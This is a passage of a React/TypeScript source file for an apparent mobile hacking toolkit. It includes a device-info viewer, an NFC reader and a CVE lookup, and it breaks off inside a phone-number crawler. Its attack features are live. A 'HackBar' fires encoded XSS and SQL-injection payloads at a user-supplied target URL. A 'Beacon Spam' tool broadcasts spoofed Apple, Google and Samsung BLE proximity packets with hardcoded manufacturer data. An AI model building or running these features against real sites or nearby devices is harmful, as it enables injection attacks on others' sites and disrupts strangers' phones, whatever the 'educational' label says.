      '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
      '/*!50000SELECT*/ 1'
    ]
  };

  const copyUrl = () => {
    navigator.clipboard.writeText(url);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  
  const executeAttack = async () => {
    if (!url) return;
    (document.activeElement as HTMLElement)?.blur();
    setLoading(true);
    setResponse(null);
    setActiveTab('RESPONSE');
    
    try {
      const qs = new URLSearchParams({ target: url, method: 'GET' }).toString();
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/hackbar?${qs}`);
      const data = await res.json();
      setResponse(data);
    } catch (e: any) {
      setResponse({ error: e.message || 'Execution failed' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-4 block h-full flex flex-col">
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={url}
            onChange={e => setUrl(e.target.value)}
            onKeyDown={handleKeyDown}
            onBlur={() => saveToHistory()}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target url + param (e.g. https://example.com?id=)"
           onClear={() => setUrl('')} />
          <div className="flex gap-2 w-full sm:w-auto">
            <button 
              onClick={executeAttack}
              disabled={loading}
              className={`flex-1 sm:flex-initial px-6 py-4 sm:py-0 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${loading ? 'bg-neon-green/5 text-neon-green/50 border border-neon-green/20 cursor-not-allowed' : 'bg-neon-green text-black hover:bg-neon-green hover:shadow-[0_0_15px_rgba(57,255,20,0.4)]'}`}
            >
              {loading ? 'EXECUTING...' : 'EXECUTE'}
            </button>
            <button 
              onClick={copyUrl}
              className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-6 py-4 sm:py-0 rounded-xl text-xs font-bold hover:bg-neon-green hover:text-black transition-all whitespace-nowrap"
            >
              {copied ? 'COPIED!' : 'COPY'}
            </button>
          </div>
        </div>
        
        <div className="flex gap-2 border-b border-neon-green/20 pb-2 overflow-x-auto scrollbar-thin scrollbar-thumb-neon-green/20">
          {[...Object.keys(payloads), 'RESPONSE'].map(cat => (
            <button
              key={cat}
              onClick={() => setActiveTab(cat as any)}
              className={`px-3 py-1.5 sm:py-1 font-mono text-xs sm:text-[10px] font-bold rounded whitespace-nowrap flex-1 sm:flex-initial ${activeTab === cat ? 'bg-neon-green text-black' : 'text-neon-green hover:bg-neon-green/10'}`}
            >
              {cat}
            </button>
          ))}
        </div>

        <div className="flex-1 overflow-y-auto space-y-2 pb-4">
           {activeTab === 'RESPONSE' ? (
             <div className="bg-[#050505] border border-neon-green/20 p-4 rounded-xl font-mono text-xs text-neon-green/80 min-h-[200px] whitespace-pre-wrap break-all">
                {loading ? (
                  <span className="animate-pulse">Awaiting target response...</span>
                ) : response ? (
                  <>
                    {response.error && <div className="text-red-500 mb-2">ERROR: {response.error}</div>}
                    {response.status && <div className="mb-2 text-white">STATUS: HTTP {response.status} {(response as any).statusText}</div>}
                    {response.data && <div className="text-gray-400 mt-4 border-t border-neon-green/10 pt-4">{response.data}</div>}
                  </>
                ) : (
                  <span className="text-neon-green/40">No response yet. Execute an attack payload.</span>
                )}
             </div>
           ) : (
             payloads[activeTab as keyof typeof payloads].map((p, i) => (
             <div key={i} className="flex flex-col sm:flex-row gap-4 sm:items-center bg-[#050505] border border-neon-green/10 p-4 sm:p-3 rounded-lg hover:border-neon-green/30 transition-all">
                <code className="text-neon-green/80 flex-1 text-xs sm:text-[10px] break-all">{p}</code>
                <div className="flex flex-wrap sm:flex-nowrap gap-2 items-center shrink-0 w-full sm:w-auto mt-2 sm:mt-0">
                  <button
                    onClick={() => setUrl(prev => prev + p)}
                    className="flex-1 sm:flex-initial bg-neon-green/5 text-neon-green border border-neon-green/20 px-3 py-2 sm:py-1 rounded text-xs sm:text-[10px] font-bold hover:bg-neon-green hover:text-black transition-all whitespace-nowrap"
                  >
                    APPEND
                  </button>
                  <button
                    onClick={() => setUrl(prev => prev + encodeURIComponent(p))}
                    className="flex-1 sm:flex-initial bg-neon-green/5 text-neon-green border border-neon-green/20 px-3 py-2 sm:py-1 rounded text-xs sm:text-[10px] font-bold hover:bg-neon-green hover:text-black transition-all whitespace-nowrap"
                  >
                    URL ENCODE
                  </button>
                  <button
                    onClick={() => {
                      setUrl(prev => prev + p);
                      setTimeout(() => executeAttack(), 100);
                    }}
                    className="flex-1 sm:flex-initial bg-neon-green text-black px-3 py-2 sm:py-1 rounded text-xs sm:text-[10px] font-bold hover:bg-white hover:text-black transition-all whitespace-nowrap"
                  >
                    FIRE
                  </button>
                </div>
             </div>
           ))
           )}
        </div>
      </div>
    </CustomToolLayout>
  );
}

export function DeviceInfoTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [results, setResults] = useState<any[] | null>(null);

  const scan = () => {
    setScanning(true);
    setTimeout(() => {
      const mem = (navigator as any).deviceMemory;
      const cores = navigator.hardwareConcurrency;
      const info = [
        { label: 'User Agent', value: navigator.userAgent },
        { label: 'Platform', value: navigator.platform },
        { label: 'Language', value: navigator.language },
        { label: 'Screen Resolution', value: `${screen.width}x${screen.height}` },
        { label: 'Color Depth', value: `${screen.colorDepth}-bit` },
        { label: 'Device Memory', value: mem ? `${mem} GB` : 'Unknown' },
        { label: 'Hardware Concurrency', value: cores ? `${cores} Cores` : 'Unknown' },
        { label: 'Network Connection', value: navigator.onLine ? 'Online' : 'Offline' },
        { label: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No' },
        { label: 'Touch Points', value: navigator.maxTouchPoints }
      ];
      setResults(info);
      setScanning(false);
    }, 600);
  };

  useEffect(() => { scan(); }, []);

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between mb-4">
          <span>LOCAL SYSTEM CAPABILITIES</span>
          <button 
            onClick={scan} 
            disabled={scanning}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-3 py-1 rounded text-[10px] font-bold uppercase tracking-wider disabled:opacity-50 hover:bg-neon-green hover:text-black transition-all"
          >
            {scanning ? 'SCANNING...' : 'RESCAN'}
          </button>
        </label>
        
        {scanning ? (
           <div className="flex flex-col items-center justify-center p-12 border border-neon-green/20 rounded-xl bg-[#050505]">
             <div className="w-8 h-8 rounded-full border-2 border-neon-green/20 border-t-neon-green animate-spin mb-4" />
             <p className="text-neon-green text-xs font-mono tracking-widest uppercase">INTERROGATING HARDWARE...</p>
           </div>
        ) : results ? (
           <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
             {results.map((r, i) => (
               <div key={i} className="border border-white/5 bg-[#050505] rounded-xl p-4 flex flex-col justify-center overflow-hidden">
                 <span className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1 truncate">{r.label}</span>
                 <span className="text-neon-green text-xs font-mono break-words">{r.value}</span>
               </div>
             ))}
           </div>
        ) : null}
      </div>
    </CustomToolLayout>
  );
}

function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [message, setMessage] = useState<string>('');
  const [devices, setDevices] = useState<any[]>([]);
  const [activeTab, setActiveTab] = useState<'scanner' | 'beacon'>('scanner');
  const [spamming, setSpamming] = useState(false);

  useEffect(() => {
    return () => {
      if (Capacitor.isNativePlatform()) {
        BleClient.stopLEScan().catch(console.error);
        BleClient.stopAdvertising().catch(() => {});
      }
    };
  }, []);

  const startScan = async () => {
    (document.activeElement as HTMLElement)?.blur();
    try {
      if (Capacitor.isNativePlatform()) {
        setScanning(true);
        setMessage('Initializing native Bluetooth LE engine...');
        await BleClient.initialize();
        setMessage('Scanning for nearby BLE signals...');
        
        await BleClient.requestLEScan({
          allowDuplicates: false
        }, (result) => {
          setDevices(prev => {
            const exists = prev.find(d => d.id === result.device.deviceId);
            if (exists) {
              return prev.map(d => d.id === result.device.deviceId ? { ...d, rssi: result.rssi } : d);
            }
            return [...prev, { 
              id: result.device.deviceId, 
              name: result.device.name || result.localName || 'Unknown Device',
              rssi: result.rssi,
              raw: result
            }];
          });
        });
        
        setTimeout(async () => {
          await BleClient.stopLEScan();
          setScanning(false);
          setMessage('Scan complete.');
        }, 15000);
      } else {
        if (!('bluetooth' in navigator)) {
          setMessage('Cannot connect. Web Bluetooth not supported.');
          setScanning(false);
          return;
        }
        setScanning(true);
        const device = await (navigator as any).bluetooth.requestDevice({ acceptAllDevices: true });
        setDevices(prev => [...prev, { id: device.id, name: device.name || 'Unknown', rssi: 'N/A' }]);
        setScanning(false);
      }
    } catch (error: any) {
      setMessage('Error: ' + error.message);
      setScanning(false);
    }
  };

  const startSpamBeacon = async (type: 'apple' | 'google' | 'samsung') => {
    if (!Capacitor.isNativePlatform()) {
      setMessage('Beacon Spamming requires native Android/iOS capabilities.');
      return;
    }
    try {
      setSpamming(true);
      setMessage(`Initializing ${type.toUpperCase()} spoofing sequence...`);
      await BleClient.initialize();

      // Simulated/Educational BLE Spamming payloads (Apple Action/Proximity)
      // Note: Real spamming usually involves raw advertising packets which might
      // require specific plugins or rooted access for some advanced packets.
      // We'll use the available startAdvertising with manufacturer data.

      let manufacturerData: number[] = [];
      if (type === 'apple') {
        manufacturerData = [0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12];
      } else if (type === 'google') {
        manufacturerData = [0xe0, 0x00, 0x01, 0x02, 0x03];
      } else {
        manufacturerData = [0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09];
      }

      await BleClient.startAdvertising({
        name: type === 'apple' ? 'AirPods Pro' : type === 'google' ? 'Pixel Buds' : 'Galaxy Buds',
        services: [],
        manufacturerId: manufacturerData[0] << 8 | manufacturerData[1],
        manufacturerData: manufacturerData.slice(2)
      });

      setMessage(`BEACON ACTIVE: Broadcasting ${type.toUpperCase()} proximity packets...`);
    } catch (error: any) {
      setMessage('Spam Error: ' + error.message);
      setSpamming(false);
    }
  };

  const stopSpam = async () => {
    try {
      await BleClient.stopAdvertising();
      setSpamming(false);
      setMessage('Beacon broadcast terminated.');
    } catch(e) {}
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <div className="flex gap-2 border-b border-neon-green/20 pb-2">
           <button onClick={() => setActiveTab('scanner')} className={`flex-1 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'scanner' ? 'text-neon-green bg-neon-green/10 rounded' : 'text-gray-500'}`}>SCANNER</button>
           <button onClick={() => setActiveTab('beacon')} className={`flex-1 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'beacon' ? 'text-neon-green bg-neon-green/10 rounded' : 'text-gray-500'}`}>BEACON SPAM</button>
        </div>

        {activeTab === 'scanner' ? (
          <>
            <div className="flex flex-col items-center justify-center border border-neon-green/20 bg-neon-green/5 rounded-2xl p-8 flex-1 min-h-[250px] text-center">
              <div className={`w-20 h-20 rounded-full border-2 ${scanning ? 'border-neon-green animate-pulse shadow-[0_0_15px_rgba(57,255,20,0.3)]' : 'border-neon-green/30'} flex items-center justify-center mb-6`}>
                 <span className="text-3xl text-neon-green font-bold">BT</span>
              </div>
              <p className="text-[10px] text-gray-400 font-mono mb-8 max-w-xs leading-relaxed uppercase tracking-tighter">
                {message || 'Ready for 2026 BLE packet sniffing/scan sequences.'}
              </p>
              <button onClick={startScan} disabled={scanning} className="bg-neon-green text-black hover:bg-white transition-all px-8 py-3 w-full sm:w-auto rounded-xl font-bold uppercase tracking-widest text-[10px] disabled:opacity-50 shadow-lg">
                 {scanning ? 'SCANNING AIRWAVES...' : 'INITIALIZE SCAN'}
              </button>
            </div>

            {devices.length > 0 && (
               <div className="bg-[#050505] rounded-xl border border-neon-green/20 p-4 space-y-3 overflow-auto max-h-[300px]">
                 <h3 className="text-[10px] font-bold text-gray-500 tracking-widest uppercase">Nodes Detected ({devices.length})</h3>
                 {devices.sort((a,b) => (b.rssi === 'N/A' ? -100 : b.rssi) - (a.rssi === 'N/A' ? -100 : a.rssi)).map((d, i) => (
                    <div key={i} className="flex justify-between items-center border-b border-white/5 pb-2 last:border-0 hover:bg-neon-green/5 p-2 rounded transition-colors group">
                      <div className="flex flex-col min-w-0">
                        <span className="text-neon-green font-bold text-xs truncate">{d.name}</span>
                        <span className="text-gray-500 text-[9px] font-mono uppercase tracking-widest">{d.id}</span>
                        {d.raw?.manufacturerData && (
                          <span className="text-blue-400 text-[8px] font-mono mt-1">MFG: {Object.keys(d.raw.manufacturerData).join(', ')}</span>
                        )}
                      </div>
                      <div className="flex flex-col items-end shrink-0 ml-4">
                        <span className="text-gray-500 text-[8px] font-mono uppercase">Signal Strength</span>
                        <span className={`text-[10px] font-bold ${d.rssi > -60 ? 'text-green-400' : d.rssi > -80 ? 'text-yellow-400' : 'text-red-400'}`}>
                          {d.rssi} dBm
                        </span>
                      </div>
                    </div>
                 ))}
               </div>
            )}
          </>
        ) : (
          <div className="space-y-6">
            <div className="p-4 border border-neon-green/20 bg-neon-green/5 rounded-xl">
               <p className="text-[10px] text-gray-400 font-mono uppercase leading-relaxed text-center">
                 BLE Advertising allows spoofing proximity packets for various devices.
                 <br/><span className="text-neon-green">Warning: Use for educational security research only.</span>
               </p>
            </div>

            <div className="grid grid-cols-1 gap-3">
              {[
                { id: 'apple', name: 'APPLE PROXIMITY (AIRPODS)', color: 'bg-white text-black' },
                { id: 'google', name: 'GOOGLE FAST PAIR', color: 'bg-blue-500 text-white' },
                { id: 'samsung', name: 'SAMSUNG SMARTTHINGS', color: 'bg-purple-500 text-white' }
              ].map(b => (
                <button
                  key={b.id}
                  onClick={() => spamming ? stopSpam() : startSpamBeacon(b.id as any)}
                  className={`w-full py-4 rounded-xl font-bold uppercase tracking-widest text-[10px] transition-all border ${spamming && message.includes(b.id.toUpperCase()) ? 'bg-red-500 border-red-500 animate-pulse text-white' : `${b.color} border-transparent hover:opacity-90 active:scale-[0.98]`}`}
                  disabled={spamming && !message.includes(b.id.toUpperCase())}
                >
                  {spamming && message.includes(b.id.toUpperCase()) ? `STOPPING ${b.id.toUpperCase()} SPAM...` : `EXECUTE ${b.name}`}
                </button>
              ))}
            </div>

            {message && (
              <div className="p-3 bg-black border border-neon-green/20 rounded-lg text-center">
                <span className="text-neon-green font-mono text-[9px] uppercase tracking-widest">{message}</span>
              </div>
            )}
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [message, setMessage] = useState<string>('');
  const [records, setRecords] = useState<any[]>([]);

  useEffect(() => {
    return () => {
      // cleanup on unmount
      if (Capacitor.isNativePlatform()) {
        CapacitorNfc.stopScanning().catch(() => {});
      }
    };
  }, []);

  const startScan = async () => {
    (document.activeElement as HTMLElement)?.blur();
    try {
      if (Capacitor.isNativePlatform()) {
        setScanning(true);
        setMessage('Ready. Bring NFC tag near the device antenna...');

        // Listen once for the scanned event
        await CapacitorNfc.addListener('nfcEvent', async (event) => {
          setMessage(`Scanned Tag! Serial: ${event.tag.id || 'Unknown'} - Type: ${event.tag.type || 'Unknown'}`);
          const decoded = [];
          if (event.tag.ndefMessage) {
            for (const record of event.tag.ndefMessage) {
               // The plugin usually parses text payloads into record.payload
               decoded.push({
                 type: record.type ? String.fromCharCode(...record.type) : 'Unknown',
                 data: record.payload ? String.fromCharCode(...record.payload) : '<binary>'
               });
            }
          } else {
             decoded.push({ type: 'Info', data: 'Tag has no NDEF records or is empty.' });
          }
          setRecords(decoded);
          setScanning(false);
          await CapacitorNfc.stopScanning();
        });

        await CapacitorNfc.startScanning();
      } else {
        // web fallback
        if (!('NDEFReader' in window)) {
          setMessage('Cannot connect. Make sure NFC is turned on and supported by this device browser.');
          setScanning(false);
          return;
        }
        setScanning(true);
        setMessage('Please bring an NFC tag near the device...');
        const ndef = new (window as any).NDEFReader();
        await ndef.scan();

        ndef.addEventListener("readingerror", () => {
          setMessage('Error reading NFC tag. Try again.');
          setScanning(false);
        });

        ndef.addEventListener("reading", ({ message, serialNumber }: any) => {
          setMessage(`Read tag with Serial Number: ${serialNumber}`);
          const decodedRecords = [];
          for (const record of message.records) {
            const textDecoder = new TextDecoder(record.encoding || 'utf-8');
            try {
              decodedRecords.push({
                type: record.recordType,
                mediaType: record.mediaType,
                data: textDecoder.decode(record.data)
              });
            } catch(e) {
              decodedRecords.push({ type: record.recordType, data: '<binary data>' });
            }
          }
          setRecords(decodedRecords);
          setScanning(false);
        });
      }
    } catch (error: any) {
      setMessage(`Error: ${error.message}`);
      setScanning(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between mb-4">
          <span>NFC READER</span>
          <button
            onClick={startScan}
            disabled={scanning}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-3 py-1 rounded text-[10px] font-bold uppercase tracking-wider disabled:opacity-50 hover:bg-neon-green hover:text-black transition-all"
          >
            {scanning ? 'WAITING...' : 'START SCAN'}
          </button>
        </label>
        
        {scanning ? (
           <div className="flex flex-col items-center justify-center p-12 border border-neon-green/20 rounded-xl bg-[#050505] shadow-[0_0_20px_rgba(57,255,20,0.1)]">
             <div className="w-8 h-8 rounded-full border-2 border-neon-green/20 border-t-neon-green animate-spin mb-4" />
             <p className="text-neon-green text-xs font-mono tracking-widest uppercase text-center">{message || 'WAITING FOR NFC TAG...'}</p>
           </div>
        ) : (
           <div className="h-full border border-white/5 bg-[#050505] rounded-xl p-4 overflow-y-auto font-mono text-xs text-neon-green/80 flex flex-col gap-4">
               {message && <div className="text-white mb-2">{message}</div>}
               {records.map((r, i) => (
                 <div key={i} className="border border-neon-green/10 p-2 rounded">
                   <div className="text-gray-500 mb-1">Type: {r.type}</div>
                   {r.mediaType && <div className="text-gray-500 mb-1">Media: {r.mediaType}</div>}
                   <div className="break-words">{r.data}</div>
                 </div>
               ))}
           </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

let cachedRecentCves: any[] | null = null;
let cveFetchPromise: Promise<any> | null = null;

const prefetchCves = () => {
  if (!cveFetchPromise) {
    const backendUrl = getBackendUrl();
    cveFetchPromise = fetch(`${backendUrl}/api/net/cve/recent`)
      .then(r => r.json())
      .then(d => {
         let data = [];
         if (Array.isArray(d)) {
            data = d.slice(0, 15);
         } else if (d && d.vulnerabilities && Array.isArray(d.vulnerabilities)) {
            data = d.vulnerabilities;
         }
         cachedRecentCves = data;
         return data;
      })
      .catch(() => {
         cveFetchPromise = null;
         return [];
      });
  }
  return cveFetchPromise;
};

// Pre-fetch immediately
setTimeout(prefetchCves, 1000);

export function CveTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: cveId, setValue: setCveId, handleKeyDown, saveToHistory } = useInputHistory('');
  const [data, setData] = useState<any>(null);
  const [recentCves, setRecentCves] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [loadingMore, setLoadingMore] = useState(false);
  const [error, setError] = useState('');
  const [startIndex, setStartIndex] = useState(0);

  const fetchRecent = async (index = 0) => {
    if (index === 0) setLoading(true);
    else setLoadingMore(true);

    setError('');
    try {
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/cve/recent?startIndex=${index}`);
      if (!res.ok) throw new Error('Failed to fetch recent CVEs');
      const json = await res.json();

      if (json.vulnerabilities) {
        if (index === 0) setRecentCves(json.vulnerabilities);
        else setRecentCves(prev => [...prev, ...json.vulnerabilities]);
        setStartIndex(index + json.vulnerabilities.length);
      }
    } catch (e: any) {
      setError('Could not populate database. NVD API might be rate-limited.');
    } finally {
      setLoading(false);
      setLoadingMore(false);
    }
  };

  useEffect(() => {
    fetchRecent(0);
  }, []);

  const searchCve = async (idToSearch?: string) => {
    const targetId = idToSearch || cveId;
    if (!targetId) return;
    (document.activeElement as HTMLElement)?.blur();
    if (!idToSearch) saveToHistory();
    setLoading(true);
    setError('');
    setData(null);
    try {
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/cve/search?id=${encodeURIComponent(targetId)}`);
      if (!res.ok) throw new Error('CVE not found or API error');
      const json = await res.json();
      if (!json || !json.data) throw new Error('CVE not found');
      setData({ fallback: json.fallback, data: json.data });
    } catch(e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">
          {recentCves.length > 0 && !data ? 'RECENT CVEs & SEARCH' : 'CVE DATABASE SEARCH'}
        </label>
        <div className="flex flex-col sm:flex-row gap-3 p-1">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={cveId}
            onChange={e => setCveId(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="e.g. CVE-2024-1234"
           onClear={() => setCveId('')} />
          <button
            onClick={() => searchCve()}
            disabled={loading}
            className="shrink-0 bg-neon-green/10 text-neon-green border border-neon-green/30 px-6 py-4 sm:py-0 rounded-xl text-xs font-bold uppercase tracking-wider hover:bg-neon-green hover:text-black transition-all disabled:opacity-50 whitespace-nowrap"
          >
            {loading && !loadingMore ? '...' : 'FIND'}
          </button>
        </div>

        {error && (
          <div className="p-4 border border-red-500/30 text-red-500 bg-red-500/10 rounded-xl text-xs">
            {error}
          </div>
        )}

        {!data && !error && (
          <div className="flex-1 flex flex-col overflow-hidden bg-[#050505] rounded-xl border border-neon-green/20">
             <div className="flex-1 overflow-auto p-4 scrollbar-thin scrollbar-thumb-neon-green/20">
               <h3 className="text-xs font-bold text-gray-500 tracking-widest uppercase mb-4">Most Recent Vulnerabilities</h3>
               {loading && startIndex === 0 ? (
                 <div className="flex items-center justify-center py-10 text-neon-green text-xs animate-pulse">Synchronizing with Global Database...</div>
               ) : (
                 <div className="space-y-4">
                    {recentCves.map((cve, i) => (
                      <div key={i} className="border-b border-neon-green/10 pb-4 last:border-0 cursor-pointer hover:bg-neon-green/5 p-2 rounded transition-all" onClick={() => searchCve(cve.id)}>
                         <div className="flex items-center justify-between mb-1">
                            <span className="text-neon-green font-bold text-xs">{cve.id}</span>
                            {cve.cvss && <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded border border-red-500/30">CVSS: {cve.cvss}</span>}
                         </div>
                         <p className="text-gray-400 text-[10px] line-clamp-2">{cve.summary}</p>
                      </div>
                    ))}

                    <button
                      onClick={() => fetchRecent(startIndex)}
                      disabled={loadingMore}
                      className="w-full py-4 mt-2 border border-neon-green/20 rounded-lg text-neon-green text-[10px] font-bold uppercase tracking-widest hover:bg-neon-green/5 transition-all disabled:opacity-50"
                    >
                      {loadingMore ? 'FETCHING DATA...' : 'LOAD NEXT 20 CVEs'}
                    </button>
                 </div>
               )}
             </div>
          </div>
        )}

        {data && (
          <div className="flex-1 overflow-auto bg-[#050505] p-4 rounded-xl border border-neon-green/20 scrollbar-thin scrollbar-thumb-neon-green/20">
            <h3 className="text-neon-green font-bold text-lg mb-4">
              {data.fallback ? data.data.id : (data.data.cveMetadata?.cveId || 'CVE DETAILS')}
            </h3>
            
            {data.fallback ? (
              <div className="space-y-4 text-xs font-mono">
                 <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">SUMMARY:</span><br/>
                    <span className="text-gray-300">{data.data.summary}</span>
                 </div>
                 <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">PUBLISHED:</span> {data.data.Published}
                 </div>
                 {data.data.cvss && (
                   <div className="text-gray-400">
                      <span className="text-gray-500 font-bold">CVSS:</span> <span className="text-red-400">{data.data.cvss}</span>
                   </div>
                 )}
                 {data.data.references && data.data.references.length > 0 && (
                   <div className="text-gray-400 mt-4">
                     <span className="text-gray-500 font-bold block mb-2">REFERENCES:</span>
                     <ul className="list-disc pl-4 space-y-1">
                       {data.data.references.slice(0,10).map((r: string, i: number) => (
                         <li key={i}><button onClick={() => openExternalLink(r)} className="text-neon-green/80 hover:underline hover:text-neon-green break-all text-left">{r}</button></li>
                       ))}
                     </ul>
                   </div>
                 )}
              </div>
            ) : (
              <div className="space-y-4 text-xs font-mono">
                {data.data.containers?.cna?.descriptions?.map((desc: any, idx: number) => (
                  <div key={idx} className="text-gray-400">
                    <span className="text-gray-500 font-bold block mb-2">DESCRIPTION:</span>
                    <span className="text-gray-200">{desc.value}</span>
                  </div>
                ))}

                <div className="text-gray-400">
                  <span className="text-gray-500 font-bold">STATE:</span>{' '}
                  <span className={data.data.cveMetadata?.state === 'PUBLISHED' ? 'text-neon-green' : 'text-yellow-500'}>
                    {data.data.cveMetadata?.state || 'UNKNOWN'}
                  </span>
                </div>

                {data.data.containers?.cna?.metrics?.[0]?.cvssV3_1 && (
                  <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">CVSS v3.1 BASE SCORE:</span>{' '}
                    <span className="text-red-500 font-bold">{data.data.containers.cna.metrics[0].cvssV3_1.baseScore}</span>
                    {' '}({data.data.containers.cna.metrics[0].cvssV3_1.baseSeverity})
                  </div>
                )}
                
                {data.data.containers?.cna?.metrics?.[0]?.cvssV3_0 && (
                  <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">CVSS v3.0 BASE SCORE:</span>{' '}
                    <span className="text-red-500 font-bold">{data.data.containers.cna.metrics[0].cvssV3_0.baseScore}</span>
                    {' '}({data.data.containers.cna.metrics[0].cvssV3_0.baseSeverity})
                  </div>
                )}

                {data.data.containers?.cna?.affected && (
                  <div className="text-gray-400 mt-4">
                    <span className="text-gray-500 font-bold block mb-2">AFFECTED PRODUCTS:</span>
                    <ul className="list-disc pl-4 space-y-2">
                      {data.data.containers.cna.affected.map((a: any, i: number) => (
                        <li key={i}>
                          <span className="text-neon-green">{a.vendor}</span> {a.product}
                          {a.versions && (
                            <div className="text-gray-500 mt-1">
                              Versions: {a.versions.map((v: any) => v.version).join(', ')}
                            </div>
                          )}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {data.data.containers?.cna?.references && (
                  <div className="text-gray-400 mt-4">
                    <span className="text-gray-500 font-bold block mb-2">REFERENCES:</span>
                    <ul className="list-disc pl-4 space-y-1">
                      {data.data.containers.cna.references.map((ref: any, i: number) => (
                        <li key={i}>
                          <button onClick={() => openExternalLink(ref.url)} className="text-neon-green/80 hover:underline hover:text-neon-green break-all text-left">
                            {ref.url}
                          </button>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            )}
            
            <button
               onClick={() => setData(null)}
               className="mt-4 text-xs text-gray-500 hover:text-white"
            >
               ← BACK TO RECENT / SEARCH
            </button>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

export function PhoneCrawlTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('https://example.com/contact');
  const [phones, setPhones] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const crawl = async () => {
    if (!url.trim() || !/^https?:\/\//i.test(url.trim())) {
      setError('Please enter a valid URL starting with http:// or https://');
      return;
    }
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    setLoading(true);
    setError('');
    setPhones([]);
    try {
      const qs = new URLSearchParams({ target: url }).toString();
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/phonecrawl?${qs}`);
      const data = await res.json();
      
      if (!res.ok) throw new Error(data.error || 'Crawl failed.');
      
      if (data.numbers) {
        setPhones(data.numbers);
      } else {
        setPhones([]);
      }
    } catch (e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <div className="flex flex-col sm:flex-row gap-3 p-1">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={url}
            onChange={e => setUrl(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target url..."
           onClear={() => setUrl('')} />
          <button
            onClick={crawl}
            disabled={loading}
            className="shrink-0 bg-neon-green/10 text-neon-green border border-neon-green/30 px-6 py-4 sm:py-0 rounded-xl text-xs font-bold uppercase tracking-wider hover:bg-neon-green hover:text-black transition-all disabled:opacity-50 whitespace-nowrap"
          >
            {loading ? '...' : 'CRAWL'}
          </button>
        </div>

        {error && <div className="text-red-500 border border-red-500/20 bg-red-500/5 p-4 rounded-xl text-xs uppercase">{error}</div>}

        <div className="flex-1 border border-neon-green/20 rounded-xl bg-[#050505] p-4 font-mono relative">
          {phones.length > 0 && (
            <button onClick={() => setPhones([])} className="absolute top-4 right-4 bg-black hover:bg-neon-green/10 border border-red-500/30 text-gray-400 hover:text-red-400 px-3 py-1.5 rounded text-[10px] font-bold uppercase tracking-widest transition-all">Clear</button>
          )}
          {!loading && phones.length === 0 && !error && <div className="text-gray-500 text-xs">No phone numbers found or waiting to crawl.</div>}
          {loading && <div className="text-neon-green text-xs animate-pulse">Crawling DOM and extracting patterns...</div>}
          <div className="mt-8">
            {phones.map((p, i) => (
